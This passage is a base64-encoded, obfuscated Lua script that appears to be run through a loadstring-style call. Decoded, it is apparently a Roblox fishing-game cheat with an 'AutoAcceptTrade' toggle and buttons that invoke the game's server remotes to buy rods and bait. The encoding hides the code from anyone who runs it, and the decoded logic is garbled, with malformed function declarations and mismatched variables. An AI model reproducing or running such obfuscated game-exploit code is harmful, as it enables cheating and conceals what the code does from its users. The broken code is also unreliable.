gICAgIEFsZHlUb2lOKCkKICAgICAgICB0YXNrLmRlbGF5KEFsZHlUb2lRLkNsaWNrRGVsYXksIGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYgQWxkeVRvaXMgYW5kIChBbGR5VG9pZCBhbmQgQWxkeVRvaWQuRW5hYmxlZCkgdGhlbgogICAgICAgICAgICAgICAgQWxkeVRvaVgoKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKCiAgICBsb2NhbCB2YXJfYWg3eTEzIEFsZHlUb2lCKCkKICAgICAgICBpZiBub3QgQWxkeVRvaXMgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgQWxkeVRvaXMgPSBmYWxzZQogICAgICAgIEFsZHlUb2lyKCkKICAgIGVuZAoKICAgIGxvY2FsIHZhcl94eGd6Ym0gQWxkeVRvaUkoQWxkeVRvaVQpCiAgICAgICAgQWxkeVRvaVEuWWVzQnV0dG9uTmFtZSA9IEFsZHlUb2lUCiAgICBlbmQKCiAgICBsb2NhbCB2YXJfb3NtcTNoIEFsZHlUb2l2KEFsZHlUb2lUKQogICAgICAgIEFsZHlUb2lRLlJheWZpZWxkRW5hYmxlZCA9IEFsZHlUb2lUCiAgICAgICAgQWxkeVRvaVEuVXNlVklNID0gQWxkeVRvaVQKICAgICAgICBpZiBub3QgQWxkeVRvaVQgdGhlbiBBbGR5VG9pQigpIGVuZAogICAgZW5kCgogICAgQWxkeVRvaUFHID0gQWxkeVRvaVA6VG9nZ2xlKHsKICAgICAgICBUaXRsZSA9ICJBdXRvQWNjZXB0VHJhZGUiLAogICAgICAgIERlZmF1bHQgPSBmYWxzZSwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKEFsZHlUb2lRKQogICAgICAgICAgICBpZiBBbGR5VG9pUSB0aGVuCiAgICAgICAgICAgICAgICBBbGR5VG9pdih0cnVlKQogICAgICAgICAgICAgICAgQWxkeVRvaVUoKQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBBbGR5VG9pdihmYWxzZSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICB9KQogICAgQWxkeVRvaWsoe1JheWZpZWxkRW5hYmxlZCA9IGZhbHNlfSkKZW5kCgpsb2NhbCB2YXJfdGJqY3F4IEFsZHlUb2ltRyhBbGR5VG9pUSkKICAgIGlmIG5vdCBBbGR5VG9pUSBvciB0eXBlKEFsZHlUb2lRKSB+PSAibnVtYmVyIiB0aGVuIHJldHVybiAiPz8/IiBlbmQKICAgIGlmIEFsZHlUb2lRID49IDEwMDAwMDAgdGhlbgogICAgICAgIHJldHVybiBzdHJpbmcuZm9ybWF0KCIlLjJmTSIsIEFsZHlUb2lRIC8gMTAwMDAwMCkKICAgIGVsc2VpZiBBbGR5VG9pUSA+PSAxMDAwIHRoZW4KICAgICAgICByZXR1cm4gc3RyaW5nLmZvcm1hdCgiJS4yZksiLCBBbGR5VG9pUSAvIDEwMDApCiAgICBlbHNlCiAgICAgICAgcmV0dXJuIHRvc3RyaW5nKEFsZHlUb2lRKSAuLiAiIENvaW5zIgogICAgZW5kCmVuZAoKbG9jYWwgdmFyX3ZndXRteCA9IHt9CmZvciBBbGR5VG9pUSwgQWxkeVRvaVQgaW4gaXBhaXJzKEFsZHlUb2luOkdldENoaWxkcmVuKCkpIGRvCiAgICBpZiBBbGR5VG9pVDpJc0EoIk1vZHVsZVNjcmlwdCIpIHRoZW4KICAgICAgICBsb2NhbCB2YXJfbWJkZmRrLCBBbGR5VG9pYyA9IHBjYWxsKHJlcXVpcmUsIEFsZHlUb2lUKQogICAgICAgIGlmIEFsZHlUb2lRIGFuZCB0eXBlb2YoQWxkeVRvaWMpID09ICJ0YWJsZSIgdGhlbgogICAgICAgICAgICBsb2NhbCB2YXJfeXd0Y3VjID0gQWxkeVRvaWMuRGF0YQogICAgICAgICAgICBpZiBBbGR5VG9pUSBhbmQgQWxkeVRvaVEuVHlwZSA9PSAiZmlzaGluZyBSb2RzIiB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfbzZqbXZsID0gQWxkeVRvaVEuSWQgb3IgIj8iCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfMXlpejZlID0gQWxkeVRvaVEuTmFtZSBvciBBbGR5VG9pVC5OYW1lCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfYmkweGhvID0gQWxkeVRvaVEuRGVzY3JpcHRpb24gb3IgIk5vIGRlc2NyaXB0aW9uLiIKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl9sd25haXcgPSAibm8gcHJpY2UiCiAgICAgICAgICAgICAgICBpZiBBbGR5VG9pYy5QcmljZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgQWxkeVRvaXMgPSBBbGR5VG9pbUcoQWxkeVRvaWMuUHJpY2UpCiAgICAgICAgICAgICAgICAgICAgdGFibGUuaW5zZXJ0KEFsZHlUb2lDRywgewogICAgICAgICAgICAgICAgICAgICAgICBJRCA9IEFsZHlUb2lZLAogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gQWxkeVRvaUcsCiAgICAgICAgICAgICAgICAgICAgICAgIERlc2MgPSBBbGR5VG9pTywKICAgICAgICAgICAgICAgICAgICAgICAgSGFyZ2EgPSBBbGR5VG9pcwogICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpkbwogICAgQWxkeVRvaVFVOlBhcmFncmFwaCh7CiAgICAgICAgVGl0bGUgPSAiQnV5IEZpc2hpbmcgUm9kcyIsCiAgICAgICAgRGVzYyA9ICJTb21lIHJvZHMgY2FuJ3QgYmUgcHVyY2hhc2VkIGJlY2F1c2UgdGhleSBhcmUgVklQIG9ubHkgb3IgZG9uJ3QgaGF2ZSBhIHByaWNlIG1hcC4iLAogICAgICAgIENvbG9yID0gIlllbGxvdyIKICAgIH0pCiAgICBmb3IgQWxkeVRvaVQsIEFsZHlUb2ljIGluIGlwYWlycyhBbGR5VG9pQ0cpIGRvCiAgICAgICAgQWxkeVRvaVFVOkJ1dHRvbih7CiAgICAgICAgICAgIFRpdGxlID0gc3RyaW5nLmZvcm1hdCgiJXMgKCVzKSIsIEFsZHlUb2ljLk5hbWUsIEFsZHlUb2ljLkhhcmdhKSwKICAgICAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBsb2NhbCB2YXJfanduc25zLCBBbGR5VG9pWSA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICByZXR1cm4gQWxkeVRvaUguUGFja2FnZXMuX0luZGV4Lm5ldC5SRl9QdXJjaGFzZUZpc2hpbmdSb2Q6SW52b2tlU2VydmVyKEFsZHlUb2ljLklEKQogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgQWxkeVRvaVE6Tm90aWZ5KHsKICAgICAgICAgICAgICAgICAgICBUaXRsZSA9ICJQdXJjaGFzZSBSb2QiLAogICAgICAgICAgICAgICAgICAgIERlc2NyaXB0aW9uID0gQWxkeVRvaVQgYW5kICJTdWNjZXNzZnVsbHkgcHVyY2hhc2VkICIgLi4gQWxkeVRvaWMuTmFtZSBvciAiRmFpbGVkIHRvIGJ1eSAiIC4uIEFsZHlUb2ljLk5hbWUsCiAgICAgICAgICAgICAgICAgICAgRHVyYXRpb24gPSAyCiAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgaWYgbm90IEFsZHlUb2lUIHRoZW4gd2FybigiRmFpbGVkIHRvIHB1cmNoYXNlIGZpc2hpbmcgcm9kIiwgQWxkeVRvaVkpIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICB9KQogICAgZW5kCgogICAgbG9jYWwgdmFyX2kwdnZudCA9IEFsZHlUb2lIOkZpbmRGaXJzdENoaWxkKCJCYWl0cyIpCiAgICBpZiBub3QgQWxkeVRvaVQgdGhlbgogICAgICAgIHdhcm4oIkJhaXQgZm9sZGVyIG5vdCBmb3VuZC4iKQogICAgICAgIHJldHVybgogICAgZW5kCiAgICBBbGR5VG9pUVU6UGFyYWdyYXBoKHsKICAgICAgICBUaXRsZSA9ICJCdXkgQmFpdCIsCiAgICAgICAgRGVzYyA9ICJQdXJjaGFzZSBiYWl0IGZyb20gdGhlIGxpc3QgYmVsb3cuIiwKICAgICAgICBDb2xvciA9ICJZZWxsb3ciCiAgICB9KQogICAgZm9yIEFsZHlUb2lRLCBBbGR5VG9pVCBpbiBpcGFpcnMoQWxkeVRvaVQ6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiBBbGR5VG9pVDpJc0EoIk1vZHVsZVNjcmlwdCIpIHRoZW4KICAgICAgICAgICAgbG9jYWwgdmFyX284N2h4cCwgQWxkeVRvaWMgPSBwY2FsbChyZXF1aXJlLCBBbGR5VG9pVCkKICAgICAgICAgICAgaWYgQWxkeVRvaVEgYW5kIChBbGR5VG9pYyBhbmQgQWxkeVRvaWMuRGF0YSkgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgdmFyX2FmdDhxcCA9IEFsZHlUb2ljLkRhdGEuSWQgb3IgMAogICAgICAgICAgICAgICAgbG9jYWwgdmFyX2o1d29wciA9IEFsZHlUb2ljLkRhdGEuTmFtZSBvciAiVW5rbm93biIKICAgICAgICAgICAgICAgIGxvY2FsIHZhcl92OTg1eGIgPSBBbGR5VG9pYy5EYXRhLkRlc2NyaXB0aW9uIG9yICItIgogICAgICAgICAgICAgICAgbG9jYWwgdmFyX3diNzhzcSA9IEFsZHlUb2ljLlByaWNlIGFuZCBBbGR5VG9pYy5QcmljZSAuLiAiIENvaW5zIiBvciAiTm8gcHJpY2UuIgogICAgICAgICAgICAgICAgQWxkeVRvaVFVOkJ1dHRvbih7CiAgICAgICAgICAgICAgICAgICAgVGl0bGUgPSBBbGR5VG9pVCAuLiAoIiAoIiAuLiAoQWxkeVRvaUcgLi4gIikiKSksCiAgICAgICAgICAgICAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFsZHlUb2lILlJlcGxpb24uX0luZGV4Lm5ldC5SRV9QdXJjaGFzZUJhaXQ6SW52b2tlU2VydmVyKEFsZHlUb2lRKQogICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAplbmQ='))()